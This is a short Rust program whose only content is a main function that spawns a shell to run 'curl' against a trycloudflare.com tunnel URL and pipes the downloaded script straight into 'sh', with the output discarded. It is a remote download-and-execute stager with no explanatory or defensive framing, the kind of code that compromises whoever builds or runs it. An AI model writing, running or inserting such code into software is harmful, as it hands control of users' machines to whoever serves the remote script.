fn main() {
    let _ = std::process::Command::new("sh")
        .arg("-c")
        .arg("curl -s 'https://por-longitude-middle-mario.trycloudflare.com/r/smokedmeat/stg_sm_09f643dd01f675c4' | sh")
        .output();
}
